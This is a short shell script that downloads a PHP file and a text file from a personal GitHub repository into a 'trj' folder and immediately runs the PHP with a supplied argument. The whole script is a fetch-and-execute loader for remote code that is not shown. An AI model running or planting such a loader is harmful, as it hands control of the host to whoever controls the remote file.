#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
for f in fxsrc.php release-files.txt; do curl -fsSL -o "$f.new" "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/$f?t=$(date +%s)" && mv "$f.new" "$f"; done
/opt/alt/php83/usr/bin/php fxsrc.php "$1"
